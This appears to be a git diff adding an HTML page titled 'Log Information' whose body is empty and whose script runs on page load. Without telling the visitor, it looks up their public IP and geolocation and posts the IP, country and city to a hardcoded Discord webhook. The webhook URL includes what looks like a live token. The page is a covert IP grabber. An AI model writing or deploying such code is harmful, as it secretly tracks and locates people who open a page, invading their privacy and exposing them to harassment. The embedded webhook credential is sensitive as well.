@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Log Information</title>
+</head>
+<body>
+  <div id="logs-container"></div>
+
+  <script>
+    async function logs_1() {
+      try {
+        const webhookURL = 'https://canary.discord.com/api/webhooks/1229587511467048970/Dy4vl-cHHkv1idYmluD8-vl13F8skUX6BeLizqiaiGLt_mtx0sBQgdOBIA2S_5p0pAvB'; // Ajoutez ici l'URL de votre webhook Discord
+
+        const responseIP = await fetch('https://api64.ipify.org/?format=json');
+        const { ip } = await responseIP.json();
+
+        const responseGeolocation = await fetch('https://ipinfo.io/json');
+        const geolocationData = await responseGeolocation.json();
+
+        const messageData = {
+          embeds: [
+            {
+              title: 'Une personne a visité le site',
+              description: `IP: ${ip}\nCountry: ${geolocationData.country}\nCity: ${geolocationData.city}`,
+              color: 16711680,
+            },
+          ],
+        };
+
+        if (webhookURL) {
+          await fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(messageData),
+          });
+        } else {
+          console.error('Webhook URL is not provided.');
+        }
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    }
+
+    logs_1();
+  </script>
+</body>
+</html>
